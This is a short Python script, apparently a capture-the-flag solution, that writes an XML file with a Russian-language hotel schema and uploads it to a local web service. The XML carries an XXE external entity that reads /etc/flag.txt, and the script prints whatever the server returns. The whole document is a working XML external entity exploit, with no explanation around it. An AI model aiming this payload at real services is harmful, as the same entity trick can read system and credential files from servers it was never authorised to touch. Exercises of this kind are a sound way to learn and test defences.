import requests

xml_content = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/flag.txt">
]>
<ОтельнаяИнформация>
    <Отель>&xxe;</Отель>
    <Дата>15.08.2024</Дата>
    <Город>Крабоград</Город>
</ОтельнаяИнформация>
'''

url = 'http://127.0.0.1:7511/'

# Создаем временный файл с XML содержимым
with open('./exploit.xml', 'w') as file:
    file.write(xml_content)

# Отправляем файл на сервер
with open('exploit.xml', 'rb') as file:
    files = {'file': ('exploit.xml', file, 'text/xml')}
    response = requests.post(url, files=files)

print(response.text)
